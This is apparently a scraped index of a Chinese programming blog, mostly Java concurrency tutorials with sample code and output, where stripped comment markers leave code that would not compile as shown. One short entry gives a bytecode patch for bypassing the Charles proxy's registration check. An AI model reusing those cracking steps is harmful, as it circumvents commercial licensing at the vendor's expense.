System.out.println(Thread.currentThread().getName() + \u0026#34; 运行中...\u0026#34;); } catch (InterruptedException e) { e.printStackTrace(); } }); } for (int i = 0; i \u0026lt; n; i++) { executorService.execute(() -\u0026gt; { try { TimeUnit.SECONDS.sleep(ThreadLocalRandom.current().nextInt(5)); latch.countDown(); 阈值减 1 System.out.println(Thread.currentThread().getName() + \u0026#34; 运行...\u0026#34;); } catch (InterruptedException e) { e.printStackTrace(); } }); } executorService.shutdown(); } } ---- 输出： pool-1-thread-1 等待中... pool-1-thread-2 等待中... pool-1-thread-3 等待中... pool-1-thread-4 等待中... pool-1-thread-5 等待中... pool-1-thread-7 运行... pool-1-thread-6 运行... pool-1-thread-8 运行... pool-1-thread-1 运行中... pool-1-thread-5 运行中... pool-1-thread-4 运行中... pool-1-thread-2 运行中... pool-1-thread-3 运行中... CyclicBarrier 循环同步栅栏 import java.util.concurrent.*; public class Main { public static void main(String[] args) { int n = 3; CyclicBarrier barrier = new CyclicBarrier(n, () -\u0026gt; System.out.println(\u0026#34;阶段性完成\u0026#34;)); 初始阈值为 3 ExecutorService executorService = Executors.newCachedThreadPool(); for (int i = 0; i \u0026lt; n; i++) { executorService.execute(() -\u0026gt; { try { for (int j = 1; j \u0026lt;= 4; j++) { TimeUnit.SECONDS.sleep(ThreadLocalRandom.current().nextInt(5)); System.out.println(Thread.currentThread().getName() + \u0026#34; 完成任务 \u0026#34; + j); barrier.await(); 阈值减 1，并等待阈值减为 0；同步后，重置阈值，并调用回调事件 } } catch (InterruptedException | BrokenBarrierException e) { e.printStackTrace(); } }); } executorService.shutdown(); } } ---- 输出： pool-1-thread-1 完成任务 1 pool-1-thread-3 完成任务 1 pool-1-thread-2 完成任务 1 阶段性完成 pool-1-thread-1 完成任务 2 pool-1-thread-3 完成任务 2 pool-1-thread-2 完成任务 2 阶段性完成 pool-1-thread-3 完成任务 3 pool-1-thread-2 完成任务 3 pool-1-thread-1 完成任务 3 阶段性完成 pool-1-thread-3 完成任务 4 pool-1-thread-1 完成任务 4 pool-1-thread-2 完成任务 4 阶段性完成 Semaphore 计数信号量 import java.util.concurrent.ExecutorService; import java.util.concurrent.Executors; import java.util.concurrent.Semaphore; import java.util.concurrent.TimeUnit; public class Main { public static void main(String[] args) { Semaphore semaphore = new Semaphore(3); 信号量（最大并发量）为 3 ExecutorService executorService = Executors.newCachedThreadPool(); for (int n = 0; n \u0026lt; 5; n++) { executorService.execute(() -\u0026gt; { System.out.println(Thread.currentThread().getName() + \u0026#34; 等待信号...\u0026#34;); semaphore.acquire(); 获得信号（应该在 try 块外获得信号，以防止不必要的释放信号） try { System.out.println(Thread.currentThread().getName() + \u0026#34; 获得信号...\u0026#34;); for (int i = 0; i \u0026lt; 2; i++) { System.out.println(Thread.currentThread().getName() + \u0026#34; 运行中...\u0026#34;); TimeUnit.SECONDS.sleep(1); } } catch (InterruptedException e) { e.printStackTrace(); } finally { semaphore.release(); 释放信号 System.out.println(Thread.currentThread().getName() + \u0026#34; 释放信号...\u0026#34;); } }); } executorService.shutdown(); } } ---- 输出： pool-1-thread-1 等待信号... pool-1-thread-2 等待信号... pool-1-thread-3 等待信号... pool-1-thread-1 获得信号... pool-1-thread-2 获得信号... pool-1-thread-1 运行中... pool-1-thread-3 获得信号... pool-1-thread-3 运行中... pool-1-thread-2 运行中... pool-1-thread-4 等待信号... pool-1-thread-5 等待信号... pool-1-thread-1 运行中... pool-1-thread-2 运行中... pool-1-thread-3 运行中... pool-1-thread-2 释放信号... pool-1-thread-4 获得信号... pool-1-thread-4 运行中... pool-1-thread-1 释放信号... pool-1-thread-3 释放信号... pool-1-thread-5 获得信号... pool-1-thread-5 运行中... pool-1-thread-4 运行中... pool-1-thread-5 运行中... pool-1-thread-5 释放信号... pool-1-thread-4 释放信号... Exchanger 用于在 成对 的线程之间 同步交换数据。 import java.util.concurrent.*; public class Main { public static void main(String[] args) { Exchanger\u0026lt;String\u0026gt; exchanger = new Exchanger\u0026lt;\u0026gt;(); ExecutorService executorService = Executors.newCachedThreadPool(); executorService.execute(() -\u0026gt; { try { String s = \u0026#34; A\u0026#34;; System.out.println(Thread.currentThread().getName() + s); TimeUnit.SECONDS.sleep(ThreadLocalRandom.current().nextInt(5)); s = exchanger.exchange(s); 等待另一个线程调用 exchange 方法，同步交换数据 System.out.println(Thread.currentThread().getName() + s); } catch (InterruptedException e) { e.printStackTrace(); } }); executorService.execute(() -\u0026gt; { try { String s = \u0026#34; B\u0026#34;; System.out.println(Thread.currentThread().getName() + s); TimeUnit.SECONDS.sleep(ThreadLocalRandom.current().nextInt(5)); s = exchanger.exchange(s); System.out.println(Thread.currentThread().getName() + s); } catch (InterruptedException e) { e.printStackTrace(); } }); executorService.shutdown(); } } ---- 输出： pool-1-thread-1 A pool-1-thread-2 B pool-1-thread-1 B pool-1-thread-2 A Phaser 把多个线程 协同 执行的任务划分为 多个 阶段。 每个 阶段 可以为其加入 任意 数量的线程。 每个 线程 可以 随时 注册并参与某个阶段。 模拟 CountDownLatch import java.util.concurrent.*; public class Main { private static final int n = 3; private static final Phaser phaser = new Phaser(n); 线程的初始注册数为 3 public static void main(String[] args) throws InterruptedException { System.out.println(show()); //3 = 0 + 3 ExecutorService executorService = Executors.newCachedThreadPool(); for (int i = 0; i \u0026lt; 5; i++) { executorService.execute(() -\u0026gt; { try { phaser.register(); 注册线程（注册数加 1） System.out.println(show() + Thread.currentThread().getName() + \u0026#34; 等待中...\u0026#34;); TimeUnit.SECONDS.sleep(1); phaser.arriveAndAwaitAdvance(); 线程到达并等待所有线程到达（注册数 == 到达数）；同步后，重置为未到达状态，进入下一个阶段 System.out.println(show() + Thread.currentThread().getName() + \u0026#34; 运行中...\u0026#34;); } catch (InterruptedException e) { e.printStackTrace(); } }); } for (int i = 0; i \u0026lt; n; i++) { executorService.execute(() -\u0026gt; { try { TimeUnit.SECONDS.sleep(ThreadLocalRandom.current().nextInt(3, 10)); phaser.arriveAndDeregister(); 线程到达并进行注销（注册数减 1） System.out.println(show() + Thread.currentThread().getName() + \u0026#34; 运行...\u0026#34;); } catch (InterruptedException e) { e.printStackTrace(); } }); } TimeUnit.SECONDS.sleep(2); System.out.println(show()); //8 = 5 + 3 executorService.shutdown(); } private static String show() { 注册数 = 到达数 + 未到达数 return String.format(\u0026#34;%d = %d + %d \u0026#34;, phaser.getRegisteredParties(), 当前 注册数 phaser.get ArrivedParties(), 当前 到达数 phaser.get UnarrivedParties()); 当前未到达数 //phaser.get Phase() 当前阶段 } } ---- 输出： 3 = 0 + 3 4 = 0 + 4 pool-1-thread-1 等待中... 5 = 0 + 5 pool-1-thread-2 等待中... 6 = 0 + 6 pool-1-thread-3 等待中... 7 = 0 + 7 pool-1-thread-4 等待中... 8 = 0 + 8 pool-1-thread-5 等待中... 8 = 5 + 3 7 = 5 + 2 pool-1-thread-8 运行... 6 = 5 + 1 pool-1-thread-6 运行... 5 = 0 + 5 pool-1-thread-7 运行... 5 = 0 + 5 pool-1-thread-4 运行中... 5 = 0 + 5 pool-1-thread-5 运行中... 5 = 0 + 5 pool-1-thread-2 运行中... 5 = 0 + 5 pool-1-thread-3 运行中... 5 = 0 + 5 pool-1-thread-1 运行中... 模拟 CyclicBarrier import java.util.concurrent.*; public class Main { public static void main(String[] args) { int n = 3; 线程的初始注册数 int m = 4; 阶段的数量 Phaser phaser = new Phaser(n) { @Override //（当前阶段，当前注册数） protected boolean onAdvance(int phase, int registeredParties) { 重写回调事件 System.out.println(\u0026#34;阶段性完成\u0026#34;); return phase \u0026gt;= (m - 1) || registeredParties == 0; 是否进入终止状态（true 终止，false 继续） } }; ExecutorService executorService = Executors.newCachedThreadPool(); for (int i = 0; i \u0026lt; n; i++) { executorService.execute(() -\u0026gt; { try { while (!phaser.isTerminated()) { 是否处于终止状态 TimeUnit.SECONDS.sleep(ThreadLocalRandom.current().nextInt(5)); System.out.println(Thread.currentThread().getName() + \u0026#34; 完成任务 \u0026#34; + (phaser.getPhase() + 1)); 获得当前阶段 phaser.arriveAndAwaitAdvance(); 线程到达并等待所有线程到达（注册数 == 到达数）；同步后，重置为未到达状态，进入下一个阶段 } } catch (InterruptedException e) { e.printStackTrace(); } }); } executorService.shutdown(); } } ---- 输出： pool-1-thread-3 完成任务 1 pool-1-thread-2 完成任务 1 pool-1-thread-1 完成任务 1 阶段性完成 pool-1-thread-3 完成任务 2 pool-1-thread-1 完成任务 2 pool-1-thread-2 完成任务 2 阶段性完成 pool-1-thread-3 完成任务 3 pool-1-thread-2 完成任务 3 pool-1-thread-1 完成任务 3 阶段性完成 pool-1-thread-3 完成任务 4 pool-1-thread-2 完成任务 4 pool-1-thread-1 完成任务 4 阶段性完成 ","permalink":"https://xhstormr.github.io/blog/posts/java-concurrency-lock/","summary":"","title":"Java Concurrency Lock"},{"content":"Updated on 2017-07-18\nhttps://www.charlesproxy.com/\nStep 反编译 charles.jar。 搜索 Unregistered，定位至 gIbD.class。 修改属性 PcqR 的值为 true。 修改方法 PcqR 的返回值为 XhstormR。 Code iconst_1 putfield com/xk72/charles/gIbD/PcqR Z ldc \u0026#34;XhstormR\u0026#34; areturn jar -cfM charles.jar -C charles/ . java -noverify -jar charles.jar Reference https://github.com/skylot/jadx https://github.com/pxb1988/dex2jar https://github.com/JesusFreke/smali https://github.com/iBotPeaches/Apktool https://github.com/deathmarine/Luyten https://github.com/java-decompiler/jd-gui https://github.com/Col-E/Recaf https://github.com/GraxCode/JByteMod-Beta https://github.com/Konloch/bytecode-viewer https://github.com/JetBrains/intellij-community/tree/master/plugins https://github.com/leibnitz27/cfr https://set.ee/jbe/ https://github.com/ingokegel/jclasslib https://github.com/apache/commons-bcel 代码生成： https://github.com/cglib/cglib https://github.com/raphw/byte-buddy https://github.com/jboss-javassist/javassist Android： https://github.com/CalebFenton/simplify jclasslib ---- java -cp i4jruntime.jar;jclasslib-browser.jar;jclasslib-library.jar;annotations-13.0.jar;kotlin-stdlib-1.1.50.jar;kotlinx.dom-0.0.10.jar;miglayout-core-5.0.jar;miglayout-swing-5.0.jar; org.gjt.jclasslib.browser.BrowserApplication cfr ---- java -jar cfr_0_123.jar 123.jar --caseinsensitivefs true --outputdir 123 ","permalink":"https://xhstormr.github.io/blog/posts/reverse-charles/","summary":"","title":"逆向 Charles"},{"content":"Updated on 2017-07-29\nhttps://docs.oracle.com/javase/10/docs/api/java/util/concurrent | 中文\nConcept 串行：多个线程 按照顺序 使用同一个核心。（单核心）（Serial） 并发：多个线程 共同轮流 使用同一个核心。（单核心）（线程 同时存在）（Concurrent） 并行：多个线程 各自分别 使用　一个核心。（多核心）（线程 同时执行）（Parallel） 并行是并发的一个 子集，区别在于 CPU 是否为多核心。 Blocking　：　阻塞并发，内部使用 锁。 Concurrent：非阻塞并发，内部使用 CAS 操作。 Code 线程体 无返回值：Runnable import java.util.concurrent.TimeUnit; public class Action implements Runnable { @Override public void run() { 方法签名无返回值，无检查异常 try { TimeUnit.SECONDS.sleep(1); } catch (InterruptedException e) { e.printStackTrace(); } System.out.println(\u0026#34;Action Done\u0026#34;); } } 有返回值：Callable import java.util.concurrent.Callable; import java.util.concurrent.TimeUnit; public class Task implements Callable\u0026lt;Integer\u0026gt; { @Override public Integer call() throws Exception { 方法签名有返回值，有检查异常 TimeUnit.SECONDS.sleep(1); System.out.println(\u0026#34;Task Done\u0026#34;); return 9527; } } 线程池 ThreadPoolExecutor import java.util.concurrent.ExecutionException; import java.util.concurrent.ExecutorService; import java.util.concurrent.Executors; import java.util.concurrent.Future; public class Main { public static void main(String[] args) throws ExecutionException, InterruptedException { ExecutorService executorService = Executors.newCachedThreadPool(); 创建线程池 executorService.execute(new Action()); 执行 Runnable 对象，无返回值 Future\u0026lt;Integer\u0026gt; future = executorService.submit (new Task()); 执行 Callable 对象，有返回值 executorService.shutdown(); 停止接收线程体，并等待执行中的线程结束（不阻塞当前线程） System.out.println(future.get()); 获得异步执行的结果（若运算未完成，则阻塞当前线程） } } Note： int corePoolSize：线程池的最小线程数 int maximumPoolSize：线程池的最大线程数 long keepAliveTime：空闲线程的生存时间 TimeUnit timeUnit：指示时间参数的单位 BlockingQueue workQueue：存储等待执行的任务 变种： newSingleThreadExecutor：所有线程串行执行 newFixedThreadPool：最多 n 个线程并发执行 newCachedThreadPool：所有线程并发执行 ScheduledThreadPoolExecutor import java.time.Instant; import java.util.Date; import java.util.concurrent.Executors; import java.util.concurrent.ScheduledExecutorService; import java.util.concurrent.ScheduledFuture; import java.util.concurrent.TimeUnit; public class Main { public static void main(String[] args) { ScheduledExecutorService scheduledExecutorService = Executors.newScheduledThreadPool(2); ScheduledFuture\u0026lt;?\u0026gt; scheduledFuture = scheduledExecutorService.scheduleAtFixedRate(() -\u0026gt; { System.out.println(Date.from(Instant.now())); }, 1, 1, TimeUnit.SECONDS); 重复执行：每隔 1 秒执行 scheduledExecutorService.schedule(() -\u0026gt; { scheduledFuture.cancel(true); 取消任务 scheduledExecutorService.shutdown(); 关闭线程池 }, 5, TimeUnit.SECONDS); 延期执行：5 秒后执行 } } ---- 输出： Fri Jul 21 15:55:53 CST 2017 Fri Jul 21 15:55:54 CST 2017 Fri Jul 21 15:55:55 CST 2017 Fri Jul 21 15:55:56 CST 2017 Fri Jul 21 15:55:57 CST 2017 重复执行： scheduleAtFixedRate 任务开始时计时 scheduleWithFixedDelay 任务结束时计时 TimeUnit： NANOSECONDS：纳秒：1000 MICROSECONDS：微秒：1000 MILLISECONDS：毫秒：1000 SECONDS：一秒：60 MINUTES：一分：60 HOURS：一时：24 DAYS：一天 ExecutorCompletionService import java.util.concurrent.*; public class Main { public static void main(String[] args) throws ExecutionException, InterruptedException { ExecutorService executorService = Executors.newCachedThreadPool(); CompletionService\u0026lt;Integer\u0026gt; completionService = new ExecutorCompletionService\u0026lt;\u0026gt;(executorService); 按照完成任务的先后顺序，依次将结果存入内部队列 for (int n = 0; n \u0026lt; 3; n++) { completionService.submit(() -\u0026gt; { int i = ThreadLocalRandom.current().nextInt(5); 随机数生成器（本地线程） TimeUnit.SECONDS.sleep(i); return i; }); } executorService.shutdown(); for (int n = 0; n \u0026lt; 3; n++) { Future\u0026lt;Integer\u0026gt; future = completionService.take(); 从内部队列中依次取出结果并移除（若没有结果，则阻塞当前线程） System.out.println(future.get()); } } } ---- 输出： 0 1 4 ForkJoinPool（并行框架） 主要用于 计算密集型 的任务，适合 任务分而治之 且 函数递归调用 的算法。 无返回值：RecursiveAction import java.util.concurrent.ForkJoinTask; import java.util.concurrent.RecursiveAction; public class ComputeAction extends RecursiveAction { private final static int THRESHOLD = 200; 影响任务个数 private final double[] array; private final int from, to; ComputeAction(double[] array, int from, int to) { this.array = array; this.from = from; this.to = to; } @Override protected void compute() { if (to - from \u0026lt; THRESHOLD) { 当需要计算的资源小于阈值时，进行计算 for (int i = from; i \u0026lt; to; i++) { array[i] = Math.sin(array[i]) + Math.cos(array[i]) + Math.tan(array[i]); } } else { 否则，把任务一分为二，进行递归 int mid = (from + to) \u0026gt;\u0026gt;\u0026gt; 1; ComputeAction l = new ComputeAction(array, from, mid); ComputeAction r = new ComputeAction(array, mid, to); ForkJoinTask.invokeAll(l, r); 阻塞 } } } 有返回值：RecursiveTask import java.util.concurrent.ForkJoinTask; import java.util.concurrent.RecursiveTask; public class FindTask extends RecursiveTask\u0026lt;Double\u0026gt; { private final static int THRESHOLD = 200; private final double[] array; private final int from, to; FindTask(double[] array, int from, int to) { this.array = array; this.from = from; this.to = to; } @Override protected Double compute() { if (to - from \u0026lt; THRESHOLD) { double max = 0; for (int i = from; i \u0026lt; to; i++) { max = Math.max(max, array[i]); } return max; } else { int mid = (from + to) \u0026gt;\u0026gt;\u0026gt; 1; FindTask l = new FindTask(array, from, mid); FindTask r = new FindTask(array, mid, to); ForkJoinTask.invokeAll(l, r); return Math.max(l.join(), r.join()); } } } Main import java.util.concurrent.ForkJoinPool; import java.util.concurrent.ThreadLocalRandom; public class Main { public static void main(String[] args) { double[] array = ThreadLocalRandom.current().doubles(1000000).toArray(); 生成随机数组 ForkJoinPool forkJoinPool = new ForkJoinPool(); forkJoinPool.invoke(new ComputeAction(array, 0, array.length)); 执行 RecursiveAction 对象，无返回值（阻塞） Double result = forkJoinPool.invoke(new FindTask(array, 0, array.length)); 执行 RecursiveTask 对象，有返回值（阻塞） forkJoinPool.shutdown(); } } ForkJoinPool.commonPool() 的并行度默认减 1 并发队列 ArrayBlockingQueue 先入先出 队列，内部实现为数组，支持 公平访问策略。 LinkedBlockingQueue 先入先出 队列，内部实现为链表。 生产者-消费者实现： 生产者向队列 添加元素：当队列 已满 时，生产者会被阻塞； 消费者从队列 移除元素：当队列 为空 时，消费者会被阻塞。 Producer import java.util.concurrent.BlockingQueue; import java.util.concurrent.TimeUnit; import java.util.concurrent.atomic.AtomicInteger; public class Producer implements Runnable { private final static AtomicInteger productID = new AtomicInteger(); 原子 int private final BlockingQueue\u0026lt;Integer\u0026gt; queue; public Producer(BlockingQueue\u0026lt;Integer\u0026gt; queue) { this.queue = queue; } @Override public void run() { try { for (int i = 0; i \u0026lt; 10; i++) { TimeUnit.MILLISECONDS.sleep(25); int id = productID.getAndIncrement(); queue.put(id); 队列满时阻塞 System.out.println(\u0026#34;生产:\u0026#34; + id); } queue.put(-1); 队列满时阻塞 System.out.println(\u0026#34;生产结束\u0026#34;); } catch (InterruptedException e) { e.printStackTrace(); } } } Consumer import java.util.concurrent.BlockingQueue; import java.util.concurrent.TimeUnit; public class Consumer implements Runnable { private final BlockingQueue\u0026lt;Integer\u0026gt; queue; public Consumer(BlockingQueue\u0026lt;Integer\u0026gt; queue) { this.queue = queue; } @Override public void run() { try { int i; while ((i = queue.take()) != -1) { 队列空时阻塞 TimeUnit.MILLISECONDS.sleep(50); System.out.println(\u0026#34;消费:\u0026#34; + i); } System.out.println(\u0026#34;消费结束\u0026#34;); } catch (InterruptedException e) { e.printStackTrace(); } } } Main import java.util.concurrent.BlockingQueue; import java.util.concurrent.ExecutorService; import java.util.concurrent.Executors; import java.util.concurrent.LinkedBlockingQueue; public class Main { public static void main(String[] args) { BlockingQueue\u0026lt;Integer\u0026gt; queue = new LinkedBlockingQueue\u0026lt;\u0026gt;(10); 指定队列容量为 10 ExecutorService executorService = Executors.newCachedThreadPool(); for (int i = 0; i \u0026lt; 5; i++) { executorService.execute(new Producer(queue)); executorService.execute(new Consumer(queue)); } executorService.shutdown(); } } PriorityBlockingQueue 队列中的元素会 根据给定规则进行排序。 DelayQueue 队列内部持有一个 PriorityBlockingQueue，用于存储元素并 根据延迟时间进行排序。 队列中的元素需要 实现 Delayed 接口。 getDelay 方法用于获取剩余延迟。 compareTo 方法对元素进行比较。 DelayObject import java.util.concurrent.Delayed; import java.util.concurrent.TimeUnit; public class DelayObject implements Delayed { private final static TimeUnit TIME_UNIT = TimeUnit.MILLISECONDS; 内部计时单位 private final long delay; 延迟时间 private final long submit; 提交时间 private final long expired; 到期时间 public DelayObject(long delay, TimeUnit unit) { this.delay = TIME_UNIT.convert(delay, unit); this.submit = System.currentTimeMillis(); this.expired = this.submit + this.delay; } @Override public long getDelay(TimeUnit unit) { return unit.convert(expired - System.currentTimeMillis(), TIME_UNIT); } @Override public int compareTo(Delayed o) { long l1 = this.getDelay(TIME_UNIT); long l2 = o.getDelay(TIME_UNIT); return Long.compare(l1, l2); } @Override public String toString() { return \u0026#34;DelayObject{\u0026#34; + \u0026#34;submit=\u0026#34; + submit + \u0026#34;, expired=\u0026#34; + expired + \u0026#34;, delay=\u0026#34; + delay + \u0026#39;}\u0026#39;; } } Main import java.util.concurrent.DelayQueue; import java.util.concurrent.TimeUnit; public class Main { public static void main(String[] args) throws InterruptedException { DelayQueue\u0026lt;DelayObject\u0026gt; queue = new DelayQueue\u0026lt;\u0026gt;(); for (int i = 0; i \u0026lt; 5; i++) { queue.put(new DelayObject(i, TimeUnit.SECONDS)); } while (!queue.isEmpty()) { System.out.println(queue.take()); } } } ---- 输出： DelayObject{submit=1501135689170, expired=1501135689170, delay=0} DelayObject{submit=1501135689170, expired=1501135690170, delay=1000} DelayObject{submit=1501135689170, expired=1501135691170, delay=2000} DelayObject{submit=1501135689170, expired=1501135692170, delay=3000} DelayObject{submit=1501135689170, expired=1501135693170, delay=4000} SynchronousQueue 提供线程间进行 数据传递的场所，支持 公平访问策略。 调用其插入方法时，必须 等待另一个线程调用其移除方法，队列本身 不存储任何元素。 LinkedTransferQueue（推荐） SynchronousQueue、ConcurrentLinkedQueue、LinkedBlockingQueue 的超集。 Producer import java.util.concurrent.TransferQueue; import java.util.concurrent.atomic.AtomicInteger; public class Producer implements Runnable { private final static AtomicInteger productID = new AtomicInteger(); private final TransferQueue\u0026lt;Integer\u0026gt; queue; public Producer(TransferQueue\u0026lt;Integer\u0026gt; queue) { this.queue = queue; } @Override public void run() { try { for (int i = 0; i \u0026lt; 10; i++) { int id = productID.getAndIncrement(); queue.transfer(id); 等待另一个线程调用其移除方法 System.out.println(\u0026#34;生产:\u0026#34; + id); } queue.transfer(-1); 等待另一个线程调用其移除方法 System.out.println(\u0026#34;生产结束\u0026#34;); } catch (InterruptedException e) { e.printStackTrace(); } } } void transfer(E e) boolean tryTransfer(E e) boolean tryTransfer(E e, long timeout, TimeUnit unit) ---- 若没有线程调用其移除方法，则等待另一个线程调用其移除方法。 若没有线程调用其移除方法，一一一一一一一一一一一一一一则丢弃该元素，并立即返回 false。 若没有线程调用其移除方法，则在指定时间内等待；若超时，则丢弃该元素，并立即返回 false。 Consumer import java.util.concurrent.TimeUnit; import java.util.concurrent.TransferQueue; public class Consumer implements Runnable { private final TransferQueue\u0026lt;Integer\u0026gt; queue; public Consumer(TransferQueue\u0026lt;Integer\u0026gt; queue) { this.queue = queue; } @Override public void run() { try { int i; while ((i = queue.take()) != -1) { TimeUnit.SECONDS.sleep(1); System.out.println(\u0026#34;消费:\u0026#34; + i); } System.out.println(\u0026#34;消费结束\u0026#34;); } catch (InterruptedException e) { e.printStackTrace(); } } } Main import java.util.concurrent.ExecutorService; import java.util.concurrent.Executors; import java.util.concurrent.LinkedTransferQueue; import java.util.concurrent.TransferQueue; public class Main { public static void main(String[] args) { TransferQueue\u0026lt;Integer\u0026gt; queue = new LinkedTransferQueue\u0026lt;\u0026gt;(); ExecutorService executorService = Executors.newCachedThreadPool(); for (int i = 0; i \u0026lt; 2; i++) { executorService.execute(new Producer(queue)); executorService.execute(new Consumer(queue)); } executorService.shutdown(); } } ---- 输出： 生产:0 生产:1 消费:0 消费:1 生产:2 生产:3 消费:2 消费:3 生产:4 生产:5 消费:5 消费:4 ... 生产:16 生产:17 消费:16 消费:17 生产:18 生产:19 消费:18 消费:19 消费结束 生产结束 生产结束 消费结束 原子变量 原子性 -\u0026gt; Unsafe 类 -\u0026gt; CAS 操作 -\u0026gt; cmpxchg 指令 基本数据类型：AtomicInteger import java.util.concurrent.ExecutorService; import java.util.concurrent.Executors; import java.util.concurrent.TimeUnit; import java.util.concurrent.atomic.AtomicInteger; public class Main { public static void main(String[] args) throws InterruptedException { AtomicInteger i = new AtomicInteger(); ExecutorService executorService = Executors.newCachedThreadPool(); for (int n = 0; n \u0026lt; 5; n++) { executorService.execute(() -\u0026gt; { for (int j = 0; j \u0026lt; 1000; j++) { i.getAndIncrement(); 原子操作 } }); } executorService.shutdown(); executorService.awaitTermination(1, TimeUnit.DAYS); System.out.println(i.get()); } } ---- 输出： 5000 引用数据类型：AtomicReference import java.util.concurrent.ExecutorService; import java.util.concurrent.Executors; import java.util.concurrent.TimeUnit; import java.util.concurrent.atomic.AtomicReference; public class Main { public static void main(String[] args) throws InterruptedException { AtomicReference\u0026lt;Element\u0026gt; reference = new AtomicReference\u0026lt;\u0026gt;(new Element(0, 0)); ExecutorService executorService = Executors.newCachedThreadPool(); for (int n = 0; n \u0026lt; 5; n++) { executorService.execute(() -\u0026gt; { for (int j = 0; j \u0026lt; 1000; j++) { boolean flag = false; while (!flag) { 自旋锁 Element oldElement = reference.get(); Element newElement = new Element(oldElement.x + 1, oldElement.y + 1); flag = reference.compareAndSet(oldElement, newElement); 原子替换 } } }); } executorService.shutdown(); executorService.awaitTermination(1, TimeUnit.DAYS); System.out.println(reference.get()); } } ---- 输出： Element{x=5000, y=5000} class Element { public int x; public int y; public Element(int x, int y) { this.x = x; this.y = y; } @Override public String toString() { return \u0026#34;Element{\u0026#34; + \u0026#34;x=\u0026#34; + x + \u0026#34;, y=\u0026#34; + y + \u0026#39;}\u0026#39;; } } 属性原子更新：AtomicIntegerFieldUpdater import java.util.concurrent.ExecutorService; import java.util.concurrent.Executors; import java.util.concurrent.TimeUnit; import java.util.concurrent.atomic.AtomicIntegerFieldUpdater; public class Main { public static void main(String[] args) throws InterruptedException { AtomicIntegerFieldUpdater\u0026lt;Element\u0026gt; fieldUpdater = AtomicIntegerFieldUpdater.newUpdater(Element.class, \u0026#34;id\u0026#34;); 内部使用反射 Element element = new Element(0); ExecutorService executorService = Executors.newCachedThreadPool(); for (int n = 0; n \u0026lt; 5; n++) { executorService.execute(() -\u0026gt; { for (int j = 0; j \u0026lt; 1000; j++) { fieldUpdater.getAndIncrement(element); 原子更新属性 } }); } executorService.shutdown(); executorService.awaitTermination(1, TimeUnit.DAYS); System.out.println(element); } } ---- 输出： Element{id=5000} class Element { public volatile int id; 应用原子更新的属性必须为 volatile（保证可见性） public Element(int id) { this.id = id; } @Override public String toString() { return \u0026#34;Element{\u0026#34; + \u0026#34;id=\u0026#34; + id + \u0026#39;}\u0026#39;; } } 原子数组：AtomicIntegerArray import java.util.concurrent.ExecutorService; import java.util.concurrent.Executors; import java.util.concurrent.TimeUnit; import java.util.concurrent.atomic.AtomicIntegerArray; public class Main { public static void main(String[] args) throws InterruptedException { AtomicIntegerArray ints = new AtomicIntegerArray(5); ints.set(0, 1); ExecutorService executorService = Executors.newCachedThreadPool(); for (int n = 0; n \u0026lt; 5; n++) { executorService.execute(() -\u0026gt; { for (int j = 0; j \u0026lt; 1000; j++) { ints.getAndIncrement(4); } }); } executorService.shutdown(); executorService.awaitTermination(1, TimeUnit.DAYS); System.out.println(ints); } } ---- 输出： [1, 0, 0, 0, 5000] import java.util.concurrent.ExecutorService; import java.util.concurrent.Executors; import java.util.concurrent.TimeUnit; public class Main { public static void main(String[] args) throws InterruptedException { ExecutorService executorService = Executors.newCachedThreadPool(); executorService.execute(() -\u0026gt; { try { TimeUnit.SECONDS.sleep(1); } catch (InterruptedException e) { e.printStackTrace(); } System.out.println(\u0026#34;Action Done\u0026#34;); }); executorService.shutdown(); 停止接收线程体，并等待执行中的线程结束（不阻塞当前线程） System.out.println(executorService.isShutdown()); System.out.println(executorService.isTerminated()); executorService.awaitTermination(1, TimeUnit.DAYS); 阻塞当前线程，等待执行中的线程结束 System.out.println(executorService.isShutdown()); System.out.println(executorService.isTerminated()); } } ---- 输出： true false Action Done true true import java.util.Arrays; import java.util.concurrent.ForkJoinPool; import java.util.concurrent.ForkJoinTask; import java.util.concurrent.RecursiveAction; import java.util.concurrent.ThreadLocalRandom; public class Main { private final static int arraySize = 100_000_000; private final static int arrayMin = 0; private final static int arrayMax = 100_000_000; private final static int[] array = ThreadLocalRandom.current().ints(arraySize, arrayMin, arrayMax).toArray(); private final static int bucketCount = 1000; private final static int bucketSize = (arraySize / bucketCount) * 10; private final static int bucketInterval = arrayMax / bucketCount; private final static int[] bucketIndex = new int[bucketCount]; private final static int[][] bucketArr = new int[bucketCount][bucketSize]; public static void main(String[] args) { //分桶(可以使用多线程，但效益不大) long l1 = System.currentTimeMillis(); for (int i : array) { int j = i / bucketInterval; bucketArr[j][bucketIndex[j]++] = i; } //排序 long l2 = System.currentTimeMillis(); ForkJoinPool forkJoinPool = new ForkJoinPool(); forkJoinPool.invoke(new SortAction(0, bucketIndex.length)); forkJoinPool.shutdown(); //合并 long l3 = System.currentTimeMillis(); int[] ints = new int[array.length]; for (int i = 0, n = 0; i \u0026lt; bucketIndex.length; i++) { System.arraycopy(bucketArr[i], 0, ints, n, bucketIndex[i]); n += bucketIndex[i]; } //显示 long l4 = System.currentTimeMillis(); String format1 = formatNum(arrayMax) + \u0026#34; - \u0026#34; + formatNum(arrayMax); String format2 = formatNum(bucketSize) + \u0026#34; 个：\u0026#34;; for (int i = 0, n = arrayMin; i \u0026lt; bucketIndex.length; i++) { System.out.printf(format1, n, n += bucketInterval); System.out.printf(format2, bucketIndex[i]); // for (int j = 0; j \u0026lt; bucketIndex[i]; j++) { // System.out.print(bucketArr[i][j] + \u0026#34; \u0026#34;); // } System.out.println(); } System.out.println(\u0026#34;分桶:\u0026#34; + (l2 - l1)); System.out.println(\u0026#34;排序:\u0026#34; + (l3 - l2)); System.out.println(\u0026#34;合并:\u0026#34; + (l4 - l3)); System.out.println(\u0026#34;总共:\u0026#34; + (l4 - l1)); check(ints); } private static void check(int[] ints) { for (int i = 0; i \u0026lt; ints.length - 1; i++) { if (ints[i] \u0026gt; ints[i + 1]) { System.out.println(false); return; } } System.out.println(true); } private static String formatNum(int i) { return \u0026#34;%\u0026#34; + countDigits(i) + \u0026#34;d\u0026#34;; } private static int countDigits(int i) { int count = 0; for (; i != 0; i /= 10) { count++; } return count; } private static class SortAction extends RecursiveAction { private final static int THRESHOLD = 200; private final int from, to; private SortAction(int from, int to) { this.from = from; this.to = to; } @Override protected void compute() { if (to - from \u0026lt; THRESHOLD) { for (int i = from; i \u0026lt; to; i++) { Arrays.sort(bucketArr[i], 0, bucketIndex[i]); } } else { int mid = (from + to) \u0026gt;\u0026gt;\u0026gt; 1; SortAction l = new SortAction(from, mid); SortAction r = new SortAction(mid, to); ForkJoinTask.invokeAll(l, r); } } } } ---- 输出： ... 分桶:1571 排序:1697 合并:94 总共:3362 true 